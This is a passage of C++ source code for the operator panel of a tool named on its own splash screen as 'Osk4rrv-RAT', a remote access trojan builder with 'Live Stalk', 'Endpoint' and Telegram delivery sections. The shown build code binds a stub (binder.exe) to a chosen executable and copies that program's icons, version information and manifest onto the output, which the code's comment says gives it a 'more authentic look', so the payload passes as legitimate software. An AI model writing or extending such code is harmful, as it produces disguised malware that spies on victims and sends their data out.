    handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, 50.0f));
    ImGui::SetCursorScreenPos(p0);
    ImGui::Dummy(winSize);
    if (drawChromeButton("##auth_min", ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f), false))
        requestMinimize = true;
    if (drawChromeButton("##auth_close", ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f), true))
        requestClose = true;

    const float centerX = p0.x + winSize.x * 0.5f;
    const float centerY = p0.y + winSize.y * 0.5f;

    ImFont* big = fontSplash ? fontSplash : (fontHeading ? fontHeading : ImGui::GetFont());
    const char* title = "Authentication";
    float titleSize = fontSplash ? fontSplash->LegacySize : 28.0f;
    ImVec2 titleSz = big->CalcTextSizeA(titleSize, FLT_MAX, 0.0f, title);
    dl->AddText(big, titleSize, ImVec2(centerX - titleSz.x * 0.5f, centerY - 120.0f), Ui::color(Ui::TextPrimary), title);

    float lineW = 48.0f;
    float lineY = centerY - 120.0f + titleSz.y + 14.0f;
    dl->AddRectFilled(
        ImVec2(centerX - lineW * 0.5f, lineY),
        ImVec2(centerX + lineW * 0.5f, lineY + 2.0f),
        Ui::color(Ui::Accent), 1.0f);

    ImFont* body = fontBody ? fontBody : ImGui::GetFont();
    const char* subtitle = "Enter your access token to continue";
    float subSize = body->LegacySize;
    ImVec2 subSz = body->CalcTextSizeA(subSize, FLT_MAX, 0.0f, subtitle);
    dl->AddText(body, subSize, ImVec2(centerX - subSz.x * 0.5f, lineY + 20.0f), Ui::color(Ui::TextMuted), subtitle);

    ImGui::SetCursorPos(ImVec2(winSize.x * 0.5f - 140.0f, winSize.y * 0.5f - 10.0f));
    ImGui::PushStyleColor(ImGuiCol_FrameBg, Ui::SurfaceRaised);
    ImGui::PushStyleColor(ImGuiCol_FrameBgHovered, Ui::SurfaceHover);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::BorderStrong);
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 8.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(14.0f, 12.0f));
    ImGui::SetNextItemWidth(280.0f);
    ImGui::InputText("##auth_input", authTokenBuf, sizeof(authTokenBuf), ImGuiInputTextFlags_Password);
    ImGui::PopStyleVar(2);
    ImGui::PopStyleColor(4);

    ImGui::SetCursorPos(ImVec2(winSize.x * 0.5f - 70.0f, winSize.y * 0.5f + 40.0f));
    if (authenticating) {
        if (authStartTime <= 0.0f)
            authStartTime = (float)ImGui::GetTime();
        float at = ((float)ImGui::GetTime() - authStartTime) / 1.8f;
        if (at >= 1.0f) {
            authenticating = false;
            authLoggedIn = true;
            saveConfigToAppData();
            authStartTime = 0.0f;
        } else {
            const float barW = 140.0f;
            const float barH = 3.0f;
            float barX = p0.x + winSize.x * 0.5f - barW * 0.5f;
            float barY = p0.y + winSize.y * 0.5f + 50.0f;
            dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW, barY + barH), Ui::color(Ui::SurfaceRaised), 2.0f);
            dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW * at, barY + barH), Ui::color(Ui::Accent), 2.0f);
            const char* authPhase = "Authenticating...";
            ImVec2 apSz = body->CalcTextSizeA(subSize, FLT_MAX, 0.0f, authPhase);
            dl->AddText(body, subSize, ImVec2(p0.x + (winSize.x - apSz.x) * 0.5f, barY + 14.0f), Ui::color(Ui::TextMuted), authPhase);
        }
    } else if (styledButton("Login", ImVec2(140.0f, 40.0f), true)) {
        if (verifyAuthToken(authTokenBuf)) {
            authenticating = true;
            authStartTime = 0.0f;
        } else {
            showAuthFailPopup = true;
        }
    }
}

static void drawAuthFailPopup() {
    if (!showAuthFailPopup) return;
    ImGui::OpenPopup("Auth failed##modal");
    const ImVec2 center = ImGui::GetMainViewport()->GetCenter();
    ImGui::SetNextWindowPos(center, ImGuiCond_Appearing, ImVec2(0.5f, 0.5f));
    ImGui::SetNextWindowSize(ImVec2(420.0f, 220.0f), ImGuiCond_Appearing);

    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(28.0f, 25.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 12.0f);
    ImGui::PushStyleColor(ImGuiCol_PopupBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::BorderStrong);

    if (ImGui::BeginPopupModal("Auth failed##modal", &showAuthFailPopup,
            ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove |
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::Danger);
        ImGui::TextUnformatted("Authentication failed");
        if (fontHeading) ImGui::PopFont();
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 8.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("The access token you entered is invalid.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 20.0f));
        float btnW = 120.0f;
        float gap = 10.0f;
        if (styledButton("Edit", ImVec2(btnW, 40.0f), true)) {
            showAuthFailPopup = false;
            ImGui::CloseCurrentPopup();
        }
        ImGui::SameLine(0.0f, gap);
        if (styledButton("I'll do that later", ImVec2(180.0f, 40.0f), false)) {
            showAuthFailPopup = false;
            authLoggedIn = true;
            ImGui::CloseCurrentPopup();
        }
        ImGui::EndPopup();
    }
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar(2);
}

static void dbgLog(const char* fmt, ...);

static bool drawNavItem(const char* id, const char* label, int tabIndex, float y) {
    const float width = Ui::SidebarWidth - 20.0f;
    ImGui::SetCursorPos(ImVec2(10.0f, y));
    ImGui::InvisibleButton(id, ImVec2(width, 38.0f));

    const bool hovered = ImGui::IsItemHovered();
    const bool selected = currentTab == tabIndex;
    if (ImGui::IsItemClicked(ImGuiMouseButton_Left)) {
        dbgLog("nav click: %s -> tab %d (pos=%.0f,%.0f)", label, tabIndex,
            ImGui::GetItemRectMin().x, ImGui::GetItemRectMin().y);
        currentTab = tabIndex;
    }

    // One animation slot per nav entry. Sized from the declared tab count so
    // adding a tab can never index past the end (this used to be a fixed
    // animation[4] while the nav list kept growing).
    enum { kNavCount = 5 };
    static float animation[kNavCount] = { 1.0f, 0.0f, 0.0f, 0.0f, 0.0f };
    if (tabIndex < 0 || tabIndex >= kNavCount) {
        // Defensive: never index out of range if a caller passes a bad index.
        tabIndex = 0;
    }
    const float target = selected ? 1.0f : (hovered ? 0.45f : 0.0f);
    const float step = 1.0f - std::exp(-16.0f * ImGui::GetIO().DeltaTime);
    animation[tabIndex] += (target - animation[tabIndex]) * step;

    const ImVec2 screenPos = ImGui::GetItemRectMin();
    const ImVec2 screenMax = ImGui::GetItemRectMax();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    if (animation[tabIndex] > 0.01f) {
        dl->AddRectFilled(
            screenPos,
            screenMax,
            Ui::color(Ui::mix(Ui::Sidebar, Ui::SurfaceRaised, animation[tabIndex] * 0.85f)),
            6.0f);
        dl->AddRectFilled(
            ImVec2(screenPos.x, screenPos.y + 9.0f),
            ImVec2(screenPos.x + 2.5f, screenPos.y + 29.0f),
            Ui::color(Ui::mix(Ui::Sidebar, Ui::Accent, animation[tabIndex])),
            1.0f);
    }

    ImFont* navFont = fontMedium ? fontMedium : ImGui::GetFont();
    const ImVec4 textColor = selected
        ? Ui::TextPrimary
        : Ui::mix(Ui::TextMuted, Ui::TextSecondary, animation[tabIndex]);
    const float textY = screenPos.y + (38.0f - navFont->LegacySize) * 0.5f - 1.0f;
    dl->AddText(
        navFont,
        navFont->LegacySize,
        ImVec2(screenPos.x + 16.0f, textY),
        Ui::color(textColor),
        label);
    return selected;
}

static void drawSidebar() {
    const ImVec2 winPos = ImGui::GetWindowPos();
    const ImVec2 winSize = ImGui::GetWindowSize();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddLine(
        ImVec2(winPos.x + winSize.x - 1.0f, winPos.y),
        ImVec2(winPos.x + winSize.x - 1.0f, winPos.y + winSize.y),
        Ui::color(Ui::Border));

    ImGui::SetCursorPos(ImVec2(16.0f, 18.0f));
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
    ImGui::TextUnformatted("MENU");
    ImGui::PopStyleColor();

    drawNavItem("##nav_overview", "Home", 0, 44.0f);
    drawNavItem("##nav_build", "Build", 1, 88.0f);
    drawNavItem("##nav_live", "Live Stalk", 2, 132.0f);
    drawNavItem("##nav_endpoint", "Endpoint", 3, 176.0f);
    drawNavItem("##nav_settings", "Settings", 4, 220.0f);
}

static void drawPageHeader(const char* title, const char* subtitle) {
    const float width = ImGui::GetWindowSize().x;

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 18.0f));
    if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
    ImGui::TextUnformatted(title);
    ImGui::PopStyleColor();
    if (fontHeading) ImGui::PopFont();

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 46.0f));
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
    ImGui::TextUnformatted(subtitle);
    ImGui::PopStyleColor();

    ImDrawList* dl = ImGui::GetWindowDrawList();
    const ImVec2 pos = ImGui::GetWindowPos();
    dl->AddLine(
        ImVec2(pos.x + Ui::ContentPadding, pos.y + 72.0f),
        ImVec2(pos.x + width - Ui::ContentPadding, pos.y + 72.0f),
        Ui::color(Ui::Border));
}

static void drawSplashScreen() {
    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetWindowPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    // solid fill
    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), kWindowRounding);

    // drag whole splash
    handleWindowDrag(p0, winSize);

    // close / min on splash too
    if (drawChromeButton("##splash_min", ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f), false))
        requestMinimize = true;
    if (drawChromeButton("##splash_close", ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f), true))
        requestClose = true;

    // progress
    if (splashStartTime <= 0.0f)
        splashStartTime = (float)ImGui::GetTime();
    float t = ((float)ImGui::GetTime() - splashStartTime) / SPLASH_DURATION;
    if (t > 1.0f) t = 1.0f;
    // ease-out cubic
    float eased = 1.0f - (1.0f - t) * (1.0f - t) * (1.0f - t);
    splashProgress = eased;

    ImFont* big = fontSplash ? fontSplash : (fontHeading ? fontHeading : ImGui::GetFont());
    const char* title = "Osk4rrv-RAT";
    float titleSize = fontSplash ? fontSplash->LegacySize : 36.0f;
    ImVec2 titleSz = big->CalcTextSizeA(titleSize, FLT_MAX, 0.0f, title);
    float titleX = p0.x + (winSize.x - titleSz.x) * 0.5f;
    float titleY = p0.y + winSize.y * 0.38f;
    dl->AddText(big, titleSize, ImVec2(titleX, titleY), Ui::color(Ui::TextPrimary), title);

    // thin gold underline under title
    float lineW = 48.0f;
    float lineY = titleY + titleSz.y + 14.0f;
    dl->AddRectFilled(
        ImVec2(p0.x + (winSize.x - lineW) * 0.5f, lineY),
        ImVec2(p0.x + (winSize.x + lineW) * 0.5f, lineY + 2.0f),
        Ui::color(Ui::Accent),
        1.0f);

    // loading bar
    const float barW = 220.0f;
    const float barH = 3.0f;
    float barX = p0.x + (winSize.x - barW) * 0.5f;
    float barY = lineY + 28.0f;
    dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW, barY + barH), Ui::color(Ui::SurfaceRaised), 2.0f);
    dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW * splashProgress, barY + barH), Ui::color(Ui::Accent), 2.0f);

    // status text
    const char* phase = "Starting";
    if (splashProgress > 0.35f) phase = "Loading modules";
    if (splashProgress > 0.70f) phase = "Ready";
    ImFont* body = fontBody ? fontBody : ImGui::GetFont();
    float bodySize = body->LegacySize;
    ImVec2 phaseSz = body->CalcTextSizeA(bodySize, FLT_MAX, 0.0f, phase);
    dl->AddText(
        body,
        bodySize,
        ImVec2(p0.x + (winSize.x - phaseSz.x) * 0.5f, barY + 16.0f),
        Ui::color(Ui::TextMuted),
        phase);

    if (t >= 1.0f)
        showSplash = false;
}

// Open a folder in Explorer, creating it first if it does not exist yet — the
// builds directory is created lazily, so opening it before the first build
// should still land somewhere real rather than erroring.
static std::string getBuildsDir();

static void openDirectory(const std::string& dir) {
    if (dir.empty())
        return;
    CreateDirectoryA(dir.c_str(), nullptr);
    ShellExecuteA(g_hwnd, "open", dir.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}

static void drawGeneralTab() {
    const float width = ImGui::GetWindowSize().x;
    drawPageHeader("Home", "Status and quick actions");

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(22.0f, 20.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##overview_connection",
            ImVec2(width - Ui::ContentPadding * 2.0f, 150.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const ImVec2 panelPos = ImGui::GetWindowPos();
        const ImVec2 panelSize = ImGui::GetWindowSize();
        ImDrawList* dl = ImGui::GetWindowDrawList();
        const StatusPresentation status = getStatusPresentation();

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Connection status");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Telegram delivery and local setup");
        ImGui::PopStyleColor();

        const ImVec2 statusTextSize = ImGui::CalcTextSize(status.label);
        const float statusX = panelPos.x + panelSize.x - 22.0f - statusTextSize.x;
        dl->AddCircleFilled(ImVec2(statusX - 11.0f, panelPos.y + 28.0f), 3.5f, Ui::color(status.color));
        dl->AddText(ImVec2(statusX, panelPos.y + 20.0f), Ui::color(Ui::TextSecondary), status.label);

        dl->AddLine(
            ImVec2(panelPos.x + 22.0f, panelPos.y + 67.0f),
            ImVec2(panelPos.x + panelSize.x - 22.0f, panelPos.y + 67.0f),
            Ui::color(Ui::Border));

        ImGui::SetCursorPos(ImVec2(22.0f, 82.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Telegram delivery");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 22.0f - statusTextSize.x, 82.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, status.color);
        ImGui::TextUnformatted(status.label);
        ImGui::PopStyleColor();

        const char* configLabel = configLoaded ? "Saved locally" : "Not configured";
        const ImVec2 configSize = ImGui::CalcTextSize(configLabel);
        ImGui::SetCursorPos(ImVec2(22.0f, 112.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Bot configuration");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 22.0f - configSize.x, 112.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, configLoaded ? Ui::TextSecondary : Ui::TextMuted);
        ImGui::TextUnformatted(configLabel);
        ImGui::PopStyleColor();
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();

    // === Builds directory ===
    //
    // Replaces the old "Latest builds" card grid. The grid listed individual
    // outputs, but every one of them opens the same folder, so it was a lot of
    // chrome to say one thing. This shows the resolved path directly and gives a
    // single explicit action.
    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 254.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(22.0f, 20.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##overview_builds_dir",
            ImVec2(width - Ui::ContentPadding * 2.0f, 150.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const std::string buildsDir = getBuildsDir();
        // SetCursorPos()/GetCursorPos() are window-relative (padding included), so
        // the content origin is captured once and reused instead of being guessed.
        const float padX = ImGui::GetCursorPosX();
        const float padY = ImGui::GetCursorPosY();
        const float contentRight = ImGui::GetContentRegionMax().x;

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Builds Directory");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Where built executables are written.");
        ImGui::PopStyleColor();

        // The action sits on the header row, right-aligned against the title.
        //
        // It used to be drawn on the path row while the path box still spanned the
        // full panel width, so the button was painted straight over the box — and
        // because a child window takes hover priority over its parent, that overlap
        // is also why it could not be clicked. Moving it up frees the full width
        // for the path.
        const float openW = 190.0f, openH = 32.0f;
        char openLabel[96];
        snprintf(openLabel, sizeof(openLabel), "%s  Open builds Directory", ICON_FA_FOLDER_OPEN);
        ImGui::SetCursorPos(ImVec2(contentRight - openW, padY));
        if (styledButton(openLabel, ImVec2(openW, openH), true))
            openDirectory(buildsDir);

        ImGui::SetCursorPos(ImVec2(padX, 67.0f));
        ImGui::Separator();

        // The resolved path, in a raised inset so it reads as a value rather than
        // a label. It now gets the whole content width; the tooltip covers the
        // case where a deep path still does not fit.
        ImGui::SetCursorPos(ImVec2(padX, 80.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Location");
        ImGui::PopStyleColor();

        ImGui::SetCursorPos(ImVec2(padX, 102.0f));
        ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::SurfaceRaised);
        ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 6.0f);
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(10.0f, 7.0f));
        if (ImGui::BeginChild("##builds_path", ImVec2(contentRight - padX, 36.0f),
                ImGuiChildFlags_Borders,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextSecondary);
            ImGui::TextUnformatted(buildsDir.c_str());
            ImGui::PopStyleColor();
            if (ImGui::IsItemHovered())
                ImGui::SetTooltip("%s", buildsDir.c_str());
        }
        ImGui::EndChild();
        ImGui::PopStyleVar(2);
        ImGui::PopStyleColor(2);
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static std::string generateRandomCode(int length) {
    static constexpr char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device random;
    std::uniform_int_distribution<size_t> pick(0, sizeof(alphabet) - 2);
    std::string code;
    code.reserve(length);
    for (int i = 0; i < length; ++i)
        code.push_back(alphabet[pick(random)]);
    return code;
}

static std::string generateUniqueCode(int length) {
    static std::set<std::string> usedCodes;
    std::string code;
    do {
        code = generateRandomCode(length);
    } while (usedCodes.count(code) > 0);
    usedCodes.insert(code);
    return code;
}

static std::string getCurrentDate() {
    std::time_t now = std::time(nullptr);
    std::tm* localTime = std::localtime(&now);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%d-%m-%Y", localTime);
    return std::string(buf);
}

static std::string getBuildsDir() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        std::string dir = std::string(path) + "\\AppDataCfg\\builds";
        CreateDirectoryA(dir.c_str(), nullptr);
        return dir;
    }
    return "builds";
}

static void openExeFileDialog() {
    OPENFILENAMEA ofn = {};
    char filePath[MAX_PATH] = "";
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = g_hwnd;
    ofn.lpstrFilter = "Executable files (*.exe)\0*.exe\0All files (*.*)\0*.*\0";
    ofn.lpstrFile = filePath;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
    ofn.lpstrTitle = "Select .exe file";
    if (GetOpenFileNameA(&ofn)) {
        strncpy_s(selectedExePath, filePath, MAX_PATH - 1);
        const char* fileName = strrchr(filePath, '\\');
        if (fileName)
            strncpy_s(selectedExeName, fileName + 1, MAX_PATH - 1);
        else
            strncpy_s(selectedExeName, filePath, MAX_PATH - 1);
    }
}

static std::vector<char> readFileBytes(const std::string& path) {
    std::vector<char> data;
    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return data;
    LARGE_INTEGER li = {};
    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 0x7FFFFFFF) {
        CloseHandle(h);
        return data;
    }
    data.resize(static_cast<size_t>(li.QuadPart));
    DWORD read = 0;
    size_t off = 0;
    while (off < data.size()) {
        DWORD chunk = 0;
        DWORD toRead = (DWORD)std::min<size_t>(data.size() - off, 8 * 1024 * 1024);
        if (!ReadFile(h, data.data() + off, toRead, &chunk, nullptr) || chunk == 0)
            break;
        off += chunk;
        read += chunk;
    }
    CloseHandle(h);
    if (off != data.size())
        data.clear();
    return data;
}

static bool writeFileBytes(const std::string& path, const std::vector<char>& data) {
    HANDLE h = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    size_t off = 0;
    while (off < data.size()) {
        DWORD written = 0;
        DWORD toWrite = (DWORD)std::min<size_t>(data.size() - off, 8 * 1024 * 1024);
        if (!WriteFile(h, data.data() + off, toWrite, &written, nullptr) || written == 0) {
            CloseHandle(h);
            return false;
        }
        off += written;
    }
    CloseHandle(h);
    return true;
}

static bool pathFileExists(const std::string& path) {
    DWORD a = GetFileAttributesA(path.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

// Copy RT_ICON / RT_GROUP_ICON (and version info) from source PE into dest PE
struct IconCopyCtx {
    HMODULE hSrc;
    HANDLE hUpdate;
    bool ok;
};

static BOOL CALLBACK enumIconRes(HMODULE hMod, LPCWSTR type, LPWSTR name, LONG_PTR lParam) {
    IconCopyCtx* ctx = (IconCopyCtx*)lParam;
    HRSRC hRes = FindResourceW(hMod, name, type);
    if (!hRes) return TRUE;
    HGLOBAL hData = LoadResource(hMod, hRes);
    if (!hData) return TRUE;
    void* p = LockResource(hData);
    DWORD size = SizeofResource(hMod, hRes);
    if (!p || !size) return TRUE;
    if (!UpdateResourceW(ctx->hUpdate, type, name, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), p, size))
        ctx->ok = false;
    return TRUE;
}

static bool copyPeIcons(const char* srcExe, const char* destExe) {
    if (!srcExe || !srcExe[0] || !destExe || !destExe[0]) return false;
    HMODULE hSrc = LoadLibraryExA(srcExe, nullptr, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (!hSrc) return false;
    HANDLE hUpdate = BeginUpdateResourceA(destExe, FALSE);
    if (!hUpdate) {
        FreeLibrary(hSrc);
        return false;
    }
    IconCopyCtx ctx{ hSrc, hUpdate, true };
    EnumResourceNamesW(hSrc, RT_ICON, enumIconRes, (LONG_PTR)&ctx);
    EnumResourceNamesW(hSrc, RT_GROUP_ICON, enumIconRes, (LONG_PTR)&ctx);
    // Optional: version resource for more authentic look
    EnumResourceNamesW(hSrc, RT_VERSION, enumIconRes, (LONG_PTR)&ctx);
    BOOL endOk = EndUpdateResourceA(hUpdate, FALSE);
    FreeLibrary(hSrc);
    return endOk && ctx.ok;
}

// Extract every (id, language) RT_MANIFEST resource (type 24) from a PE.
//
// The LANGUAGE id matters: a resource is uniquely identified by the
// (type, name, language) triple, and UpdateResourceW refuses to delete a triple
// that does not exist (error 87), poisoning the whole update transaction. So we
// must carry the real language alongside every blob.
struct ManifestBlob {
    WORD id;
    WORD lang;
    std::vector<char> data;
};

// Context shared by the enumeration callbacks below.
struct ManifestWalkCtx {
    std::vector<ManifestBlob>* out;
};

// Language-level callback: pulls the actual bytes for one (name, lang) pair.
static BOOL CALLBACK manifestLangEnumProc(HMODULE mod, LPCWSTR type, LPWSTR name,
    WORD lang, LONG_PTR lParam) {
    ManifestWalkCtx* c = (ManifestWalkCtx*)lParam;
    HRSRC hRes = FindResourceExW(mod, type, name, lang);
    if (!hRes) return TRUE;
    HGLOBAL hData = LoadResource(mod, hRes);
    DWORD size = SizeofResource(mod, hRes);
    if (!hData || !size) return TRUE;
    void* p = LockResource(hData);
    if (!p) return TRUE;

    ManifestBlob blob;
    blob.id = IS_INTRESOURCE(name) ? (WORD)(ULONG_PTR)name : 1;
    blob.lang = lang;
    blob.data.assign((char*)p, (char*)p + size);
    c->out->push_back(std::move(blob));
    return TRUE;
}

// Name-level callback: walks every language of one manifest name.
static BOOL CALLBACK manifestNameEnumProc(HMODULE mod, LPCWSTR type, LPWSTR name,
    LONG_PTR lParam) {
    ManifestWalkCtx* c = (ManifestWalkCtx*)lParam;
    EnumResourceLanguagesW(mod, type, name,
        (ENUMRESLANGPROCW)manifestLangEnumProc, (LONG_PTR)c);
    return TRUE;
}

static std::vector<ManifestBlob> extractManifests(const std::string& path) {
    std::vector<ManifestBlob> out;
    HMODULE hSrc = LoadLibraryExA(path.c_str(), nullptr,
        LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (!hSrc) return out;

    // RT_MANIFEST == 24. MAKEINTRESOURCE avoids depending on winuser.h enums.
    ManifestWalkCtx ctx{ &out };
    EnumResourceNamesW(hSrc, MAKEINTRESOURCEW(24), manifestNameEnumProc, (LONG_PTR)&ctx);

    FreeLibrary(hSrc);
    return out;
}

// Exact (RT_MANIFEST id, language) pair — the real identity of a resource.
//
// Why this exists: updating resources is a transaction. Calling
// UpdateResourceW(type, name, lang, nullptr, 0) — the documented "delete this
// resource" form — on a triple that is NOT present does not politely fail; it
// returns ERROR_INVALID_PARAMETER (87) and invalidates the whole
// BeginUpdateResource handle. Every later UpdateResource then returns 1359 and
// EndUpdateResource aborts. That is exactly what produced the user-visible
// "Failed to embed resources in <path>" error: the builder blindly deleted
// manifest id 1 at language 0x0000, while binder.exe stores it at 0x0409.
struct ManifestKey {
    WORD id;
    WORD lang;
};

struct ManifestKeyCtx {
    std::vector<ManifestKey>* keys;
};

static BOOL CALLBACK manifestKeyLangProc(HMODULE, LPCWSTR, LPWSTR name, WORD lang,
    LONG_PTR lParam) {
    ManifestKeyCtx* c = (ManifestKeyCtx*)lParam;
    if (!IS_INTRESOURCE(name)) return TRUE;
    c->keys->push_back(ManifestKey{ (WORD)(ULONG_PTR)name, lang });
    return TRUE;
}

static BOOL CALLBACK manifestKeyNameProc(HMODULE mod, LPCWSTR type, LPWSTR name,
    LONG_PTR lParam) {
    ManifestKeyCtx* c = (ManifestKeyCtx*)lParam;
    EnumResourceLanguagesW(mod, type, name,
        (ENUMRESLANGPROCW)manifestKeyLangProc, (LONG_PTR)c);
    return TRUE;
}

static std::vector<ManifestKey> listManifestKeys(HMODULE hSrc) {
    std::vector<ManifestKey> keys;
    if (!hSrc) return keys;

    ManifestKeyCtx ctx{ &keys };
    EnumResourceNamesW(hSrc, MAKEINTRESOURCEW(24), manifestKeyNameProc, (LONG_PTR)&ctx);
    return keys;
}

// Transplant the ORIGINAL file's manifest into the destination stub so the
// final built executable requests exactly the same privileges as the original
// (no admin shield unless the original itself had one).
//
// `stubKeys` are the exact (id, language) pairs the stub (binder.exe) carries.
// We delete precisely those triples and nothing else: deleting a triple that is
// not present fails with 87 and poisons the transaction, which is what caused
// "Failed to embed resources".
static bool transplantManifestsInto(HANDLE hUpdate, const std::string& originalPath,
    const std::vector<ManifestKey>& stubKeys) {
    if (!hUpdate) return false;

    // Drop any manifest the stub already carries so we don't keep "asInvoker"
    // alongside a second embedded one — but only the triples that really exist.
    for (const ManifestKey& k : stubKeys) {
        if (!UpdateResourceW(hUpdate, MAKEINTRESOURCEW(24), MAKEINTRESOURCEW(k.id),
                k.lang, nullptr, 0)) {
            // Treat as fatal: a failed delete means a poisoned transaction, and
            // silently continuing would just produce a confusing cascade later.
            return false;
        }
    }

    std::vector<ManifestBlob> manifests = extractManifests(originalPath);
    // If the original has no manifest, we leave the stub without one too —
    // the output then runs asInvoker exactly like a plain user-mode exe.
    if (manifests.empty())
        return true;

    bool ok = true;
    for (const ManifestBlob& m : manifests) {
        if (m.data.empty()) continue;
        // Write at the SAME language the original used so the resulting PE has a
        // resource layout identical to the file the user selected.
        WORD lang = m.lang ? m.lang : (WORD)MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);
        if (!UpdateResourceW(hUpdate, MAKEINTRESOURCEW(24), MAKEINTRESOURCEW(m.id ? m.id : 1),
                lang, (void*)m.data.data(), (DWORD)m.data.size()))
            ok = false;
    }
    return ok;
}

static void dbgLog(const char* fmt, ...);

// Stage tracing for performBuild.
//
// Why: a build of a large original (e.g. an 87 MB installer) died silently —
